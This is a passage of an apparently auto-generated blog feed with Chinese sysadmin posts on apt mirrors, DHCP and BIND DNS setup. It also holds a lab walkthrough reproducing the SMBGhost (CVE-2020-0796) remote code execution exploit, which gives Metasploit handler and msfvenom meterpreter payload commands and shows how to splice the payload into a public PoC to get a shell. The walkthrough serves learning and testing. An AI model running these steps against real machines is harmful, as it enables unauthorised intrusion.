multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure><h2 id="163源"><a href="#163源" class="headerlink" title="163源"></a>163源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>更新缓存 <code>sudo apt-get update</code><br>安装更新 <code>sudo apt-get upgrade</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;备份源文件 &lt;code&gt;sudo cp -p /etc/apt/sources.list /etc/apt/sources.list.bak_2020.10.13&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;/etc/apt/sources.list&lt;/code&gt; 文件最前</summary>
      
    
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Windows：CVE-2020-0796 RCE 漏洞复现</title>
    <link href="https://administratorrs.github.io/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/"/>
    <id>https://administratorrs.github.io/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/</id>
    <published>2021-02-09T16:00:00.000Z</published>
    <updated>2021-02-10T10:37:14.831Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、影响范围（需关闭-Win10-防火墙）："><a href="#一、影响范围（需关闭-Win10-防火墙）：" class="headerlink" title="一、影响范围（需关闭 Win10 防火墙）："></a>一、影响范围（需关闭 Win10 防火墙）：</h2><ul><li>Windows 10 Version 1903 for 32-bit Systems</li><li>Windows 10 Version 1903 for ARM64-based Systems</li><li>Windows 10 Version 1903 for x64-based Systems</li><li>Windows 10 Version 1909 for 32-bit Systems</li><li>Windows 10 Version 1909 for ARM64-based Systems</li><li>Windows 10 Version 1909 for x64-based Systems</li><li>Windows Server, version 1903 (Server Core installation)</li><li>Windows Server, version 1909 (Server Core installation)<br></li></ul><hr><h2 id="二、漏洞复现："><a href="#二、漏洞复现：" class="headerlink" title="二、漏洞复现："></a>二、漏洞复现：</h2><p><strong>环境准备：</strong></p><ul><li>kali，ip：192.168.201.152（攻击机）</li><li>受影响版本的Win10，ip：192.168.201.132（须关闭防火墙）</li></ul><p><strong>漏洞检测工具下载地址：</strong></p><ul><li><p><a href="https://github.com/ollypwn/SMBGhost">https://github.com/ollypwn/SMBGhost</a></p></li><li><ul><li><strong>漏洞检测工具使用方法：</strong></li></ul></li><li><ul><li><code>pythone3 scanner.py 192.168.0.0/24</code></li></ul></li></ul><p><strong>PoC下载地址：</strong></p><ul><li><p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p></li><li><ul><li><strong>POC 使用方法：</strong></li></ul></li><li><ul><li><code>python3.8 exploit.py -ip 192.168.201.132</code><br></li></ul></li></ul><hr><h2 id="三、漏洞复现："><a href="#三、漏洞复现：" class="headerlink" title="三、漏洞复现："></a>三、漏洞复现：</h2><p>1、先对使用kali对 9999 端口进行监听：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 9999</span><br><span class="line">set rhost 192.168.201.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/1.png"></p><p>2、kali 使用 msf 生成木马（此处端口需跟监听的端口是一致的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;9999 -b &#39;\x00&#39; -i 1 -f python&gt;test.py</span><br></pre></td></tr></table></figure><p>木马生成后的内容为：<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/2.png"></p><p>下载好的 POC：<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/3.png"></p><p>3、先把木马的内的 buf 替换为 USER_PAYLOAD ，再替换 exploit.py 内的 USER_PAYLOAD 行的内容</p><ul><li>:set nu       &emsp;&emsp;// 显示行</li><li>:91,127s/buf/USER_PAYLOAD    &emsp;&emsp;// 把91-127行的 buf 替换为 USER_PAYLOAD</li></ul><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/4.png"></p><p>4、使用 Python3 运行（在此处需按一次回车）<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/5.png"><br>![](Windows：CVE-2020-0796 RCE/6.png)</p><p>5、此时监听的 9999 端口已收到访反弹的 shell</p><ul><li>// 如未收到反弹的 Shell 则使用 Python 重新运行一次 POC</li></ul><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/7.png"><br>![](Windows：CVE-2020-0796 RCE/8.png)</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、影响范围（需关闭-Win10-防火墙）：&quot;&gt;&lt;a href=&quot;#一、影响范围（需关闭-Win10-防火墙）：&quot; class=&quot;headerlink&quot; title=&quot;一、影响范围（需关闭 Win10 防火墙）：&quot;&gt;&lt;/a&gt;一、影响范围（需关闭 Win10 防火墙</summary>
      
    
    
    
    <category term="Windows 漏洞复现" scheme="https://administratorrs.github.io/categories/Windows-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://administratorrs.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Windows" scheme="https://administratorrs.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>DHCP</title>
    <link href="https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DHCP/DHCP/"/>
    <id>https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DHCP/DHCP/</id>
    <published>2021-02-08T16:00:00.000Z</published>
    <updated>2021-02-10T10:53:59.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>DHCP（动态主机配置协议）是一个局域网的网络协议。为主机分配 IP 地址。</p><p>安装：<code>yum -y install dhcp</code><br>默认端口：<code>67/68</code><br>主配置文件：<code>/etc/dhcp/dhcpd.conf</code><br>模板文件：<code>/usr/share/doc/dhcp-4.2.5/dhcpd.conf.example</code><br>执行程序：<code>/usr/sbin/dhcpd、/usr/sbin/dhcrelay</code><br>执行参数配置：<code>/etc/sysconfig/dhcpd</code><br>查看租约文件：<code>/var/lib/dhcpd/dhcpd.lease</code><br>网络服务的排错日志：<code>/var/log/messages</code></p><h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">log-facility local7;    #  指定日志文件</span><br><span class="line">ddns-update-style none; #  设置 DNS 的更新方式（可用参数：standard、interim、none）</span><br><span class="line">ignore client-updates;  #  不允许客户端更新 DNS 记录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">subnet 192.168.1.0 netmask 255.255.255.0 &#123;    #  声明子网</span><br><span class="line">  range 192.168.1.1 192.168.1.253;    #  设置范围</span><br><span class="line">  option domain-name-servers 114.114.114.114;#  设置 DNS</span><br><span class="line">  option domain-name &quot;www.test.com&quot;;  #  设置 DNS 域</span><br><span class="line">  option routers 192.168.1.254;       #  设置网关</span><br><span class="line">  option broadcast-address 192.168.1.255;#  设置广播地址</span><br><span class="line">  default-lease-time 600; #  默认租期（单位：秒）</span><br><span class="line">  max-lease-time 7200;    #  最大租期（单位：秒）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">host fantasia &#123;</span><br><span class="line">  hardware ethernet 08:00:07:26:c0:a5;  #  设置目标主机的 MAC 地址</span><br><span class="line">  fixed-address 192.168.1.111;          #  设置为其分配的保留 IP</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><h3 id="1、拷贝模板文件"><a href="#1、拷贝模板文件" class="headerlink" title="1、拷贝模板文件"></a>1、拷贝模板文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#  删除原配置文件（原配置文件内无参数）</span><br><span class="line">rm -f &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</span><br><span class="line">#  拷贝模板文件并更名为配置文件</span><br><span class="line">cp -p &#x2F;usr&#x2F;share&#x2F;doc&#x2F;dhcp-4.2.5&#x2F;dhcpd.conf.example &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</span><br><span class="line">#  备份配置文件</span><br><span class="line">cp -p &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf.bak_2020.11.13</span><br></pre></td></tr></table></figure><h3 id="2、编辑配置文件"><a href="#2、编辑配置文件" class="headerlink" title="2、编辑配置文件"></a>2、编辑配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#  可在配置文件内只保留如下内容（配置文件内有该内容）</span><br><span class="line">subnet 192.168.1.0 netmask 255.255.255.0 &#123;    #  声明子网</span><br><span class="line">  range 192.168.1.1 192.168.1.253;    #  设置范围</span><br><span class="line">  option domain-name-servers 114.114.114.114;#  设置 DNS</span><br><span class="line">  option domain-name &quot;www.test.com&quot;;  #  设置 DNS 域</span><br><span class="line">  option routers 192.168.1.254;       #  设置网关</span><br><span class="line">  option broadcast-address 192.168.1.255;#  设置广播地址</span><br><span class="line">  default-lease-time 600; #  默认租期（单位：秒）</span><br><span class="line">  max-lease-time 7200;    #  最大租期（单位：秒）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">host fantasia &#123;</span><br><span class="line">  hardware ethernet 08:00:07:26:c0:a5;  #  设置目标主机的 MAC 地址</span><br><span class="line">  fixed-address 192.168.1.111;          #  设置为其分配的保留 IP</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;p&gt;DHCP（动态主机配置协议）是一个局域网的网络协议。为主机分配 IP 地址。&lt;/p&gt;
&lt;p&gt;安装：&lt;code&gt;yum -y </summary>
      
    
    
    
    <category term="网络应用竞赛" scheme="https://administratorrs.github.io/categories/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>DNS</title>
    <link href="https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DNS/DNS/"/>
    <id>https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DNS/DNS/</id>
    <published>2021-02-08T16:00:00.000Z</published>
    <updated>2021-02-10T10:54:06.376Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置-DNS"><a href="#配置-DNS" class="headerlink" title="配置 DNS"></a>配置 DNS</h2><p><strong>一、简介</strong></p><p>把域名翻译成IP地址的软件称为域名系统，即 DNS<br>默认端口号：<code>53</code></p><p><strong>默认配置文件路径：</strong></p><p>主要配置文件（定义 bind 服务程序的运行）： <code>/etc/named.conf</code><br>区域配置文件（保存域名和IP地址对应关系的所在位置）： <code>/etc/named.rfc1912.zones</code><br>数据文件目录： <code>/var/named</code></p><p>DNS域名解析的配置文件（系统自带）： <code>/etc/resolv.conf</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#  resolv.conf 参数详解</span><br><span class="line"></span><br><span class="line">nameserver#  定义 DNS 服务器的 IP 地址（查询时按照 namserver 在文件中的顺序进行）</span><br><span class="line">domain#  定义本地域名</span><br><span class="line">search#  定义域名的搜索列表（当查询的域名没找到时，则从该参数声明的域中按前后顺序查找）</span><br><span class="line">sortlist#  对返回的域名进行排序</span><br></pre></td></tr></table></figure><hr><h2 id="二、实例"><a href="#二、实例" class="headerlink" title="二、实例"></a>二、实例</h2><p><strong>环境：</strong></p><p>centos 7，IP：10.1.82.232</p><h3 id="1、安装相关包"><a href="#1、安装相关包" class="headerlink" title="1、安装相关包"></a>1、安装相关包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  安装 dns 相关包（bind：DNS 服务程序，bind-utils：提供 DNS 工具包（域名解析和DNS调试））</span><br><span class="line">yum -y install bind bind-utils</span><br></pre></td></tr></table></figure><h3 id="2、编辑主要配置文件"><a href="#2、编辑主要配置文件" class="headerlink" title="2、编辑主要配置文件"></a>2、编辑主要配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;named.conf     #  编辑 named.conf</span><br><span class="line"></span><br><span class="line">将    listen-on port 53 &#123; 127.0.0.1; &#125;;  跟  allow-query     &#123; localhost; &#125;;</span><br><span class="line">改为  listen-on port 53 &#123; any; &#125;;        和  allow-query     &#123; any; &#125;; 即可</span><br></pre></td></tr></table></figure><p><code>named.conf</code> 配置文件详解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#  named.conf 配置文件详解</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; named.conf</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Provided by Red Hat bind package to configure the ISC BIND named(8) DNS</span><br><span class="line">&#x2F;&#x2F; server as a caching only nameserver (as a localhost DNS resolver only).</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; See &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bind*&#x2F;sample&#x2F; for example named configuration files.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; See the BIND Administrator&#39;s Reference Manual (ARM) for details about the</span><br><span class="line">&#x2F;&#x2F; configuration located in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bind-&#123;version&#125;&#x2F;Bv9ARM.html</span><br><span class="line"></span><br><span class="line">options &#123;</span><br><span class="line">listen-on port 53 &#123; any; &#125;;                   #  允许所有 IP 监听本机 53 端口（即所有用户能与本机的 DNS 进行通信）</span><br><span class="line">listen-on-v6 port 53 &#123; ::1; &#125;;                #  IPV6 监听地址</span><br><span class="line">directory &quot;&#x2F;var&#x2F;named&quot;;              #  服务器的工作目录</span><br><span class="line">dump-file &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;cache_dump.db&quot;;  #  当执行 rndc dumpdb 时服务器 dump 文件的路径</span><br><span class="line">statistics-file &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;named_stats.txt&quot;;    #  当服务器接收到 rndc stats 命令时，追加统计数据的文件路径</span><br><span class="line">memstatistics-file &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;named_mem_stats.txt&quot;;#  当退出服务器时，会将服务器的统计信息写道文件中</span><br><span class="line">allow-query     &#123; any; &#125;;              #  允许所有 IP 进行 DNS 查询</span><br><span class="line"></span><br><span class="line">&#x2F;* </span><br><span class="line"> - If you are building an AUTHORITATIVE DNS server, do NOT enable recursion.</span><br><span class="line"> - If you are building a RECURSIVE (caching) DNS server, you need to enable </span><br><span class="line">   recursion. </span><br><span class="line"> - If your recursive DNS server has a public IP address, you MUST enable access </span><br><span class="line">   control to limit queries to your legitimate users. Failing to do so will</span><br><span class="line">   cause your server to become part of large scale DNS amplification </span><br><span class="line">   attacks. Implementing BCP38 within your network would greatly</span><br><span class="line">   reduce such attack surface </span><br><span class="line">*&#x2F;</span><br><span class="line">recursion yes;    #  允许进行递归搜索</span><br><span class="line"></span><br><span class="line">dnssec-enable yes;      #  开启 DNSSEC 开关</span><br><span class="line">dnssec-validation yes;#  开启 DNSSEC 确认开关</span><br><span class="line"></span><br><span class="line">&#x2F;* Path to ISC DLV key *&#x2F;</span><br><span class="line">bindkeys-file &quot;&#x2F;etc&#x2F;named.iscdlv.key&quot;;    #  加密用的 key</span><br><span class="line"></span><br><span class="line">managed-keys-directory &quot;&#x2F;var&#x2F;named&#x2F;dynamic&quot;;#  管理密钥的路径</span><br><span class="line"></span><br><span class="line">pid-file &quot;&#x2F;run&#x2F;named&#x2F;named.pid&quot;;        #  服务器记录进程 ID 的文件路径</span><br><span class="line">session-keyfile &quot;&#x2F;run&#x2F;named&#x2F;session.key&quot;;    #  会话密钥文件</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">logging &#123;#  定义 bing 服务的日志</span><br><span class="line">        channel default_debug &#123;    #  日志输出方式</span><br><span class="line">                file &quot;data&#x2F;named.run&quot;;  #  输出到指定文件</span><br><span class="line">                severity dynamic;    #  按照服务器当前的 debug 级别记录日志</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;.&quot; IN &#123;#  定义域区（一个 zone 关键字定义一个域区）</span><br><span class="line">type hint;    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">file &quot;named.ca&quot;;#  指定存放 DNS 记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#  包含区域配置文件，用于设置正反向区域（也可在当前文件中配置正反向区域）</span><br><span class="line">include &quot;&#x2F;etc&#x2F;named.rfc1912.zones&quot;;#  如果把该行注释则 named.rfc1912.zones 文件内的配置无效</span><br><span class="line">include &quot;&#x2F;etc&#x2F;named.root.key&quot;;#  根区域的 key 文件（与事务签名相关）</span><br></pre></td></tr></table></figure><h3 id="3、编辑区域配置文件"><a href="#3、编辑区域配置文件" class="headerlink" title="3、编辑区域配置文件"></a>3、编辑区域配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;named.rfc1912.zones#  编辑区域文件</span><br><span class="line"></span><br><span class="line">在文件末尾添加正反向区域</span><br><span class="line">zone &quot;test.com&quot; IN &#123;#  定义正向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">type master;    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">file &quot;test.com.zone&quot;;#  指定存放正向区域记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">allow-update &#123; none; &#125;;#  设置允许从何处动态更新 DNS记录 的客户端地址（做主从服务器时需用到，做主从时需把从处的 none 更改为主服务器的地址）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;82.1.10.in-addr.arpa&quot; IN &#123;#  定义反向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">type master;        #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">file &quot;10.1.82.zone&quot;;#  指定存放正向区域记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">allow-update &#123; none; &#125;;#  设置允许从何处动态更新 DNS记录 的客户端地址（做主从服务器时需用到，做主从时需把从处的 none 更改为主服务器的地址）</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4、配置正向区域"><a href="#4、配置正向区域" class="headerlink" title="4、配置正向区域"></a>4、配置正向区域</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#  复制 named.localhost 文件及其属性并改名为 test.com.zone 放置在原位置</span><br><span class="line">cp -p &#x2F;var&#x2F;named&#x2F;named.localhost &#x2F;var&#x2F;named&#x2F;test.com.zone</span><br><span class="line"></span><br><span class="line">#  配置正向区域文件</span><br><span class="line">$TTL 1D</span><br><span class="line">@IN SOA@ test.com. (</span><br><span class="line">0; serial</span><br><span class="line">1D; refresh</span><br><span class="line">1H; retry</span><br><span class="line">1W; expire</span><br><span class="line">3H ); minimum</span><br><span class="line">NS@</span><br><span class="line"></span><br><span class="line">#  必须有一行不加前缀的（如没有不加前缀的这一行，则会报错）</span><br><span class="line">A10.1.82.232      #  域名指向的 IP</span><br><span class="line">wwwA10.1.82.232      #  域名前缀跟指向的 IP</span><br><span class="line">AAAA::1</span><br></pre></td></tr></table></figure><h3 id="5、配置反向区域"><a href="#5、配置反向区域" class="headerlink" title="5、配置反向区域"></a>5、配置反向区域</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#  复制 named.loopback 文件及其属性并改名为 10.1.82.zone 放置在原位置</span><br><span class="line">cp -p &#x2F;var&#x2F;named&#x2F;named.loopback &#x2F;var&#x2F;named&#x2F;10.1.82.zone</span><br><span class="line"></span><br><span class="line">#  配置反向区域文件</span><br><span class="line">$TTL 1D</span><br><span class="line">@IN SOA@ test.com. (</span><br><span class="line">0; serial</span><br><span class="line">1D; refresh</span><br><span class="line">1H; retry</span><br><span class="line">1W; expire</span><br><span class="line">3H ); minimum</span><br><span class="line">NS@</span><br><span class="line"></span><br><span class="line">#  必须有一行不加前缀的（如没有不加前缀的这一行，则会报错）</span><br><span class="line">A10.1.82.232      #  域名指向的 IP</span><br><span class="line">wwwA10.1.82.232      #  域名前缀跟指向的 IP</span><br><span class="line">AAAA::1</span><br><span class="line">232PTRwww.test.com.    #  完整的域名跟对应的 IP 后缀（域名后面的点必须有）</span><br></pre></td></tr></table></figure><h3 id="6、设置-DNS-解析"><a href="#6、设置-DNS-解析" class="headerlink" title="6、设置 DNS 解析"></a>6、设置 DNS 解析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;resolv.conf    #  编辑 DNS 域名解析配置文件</span><br><span 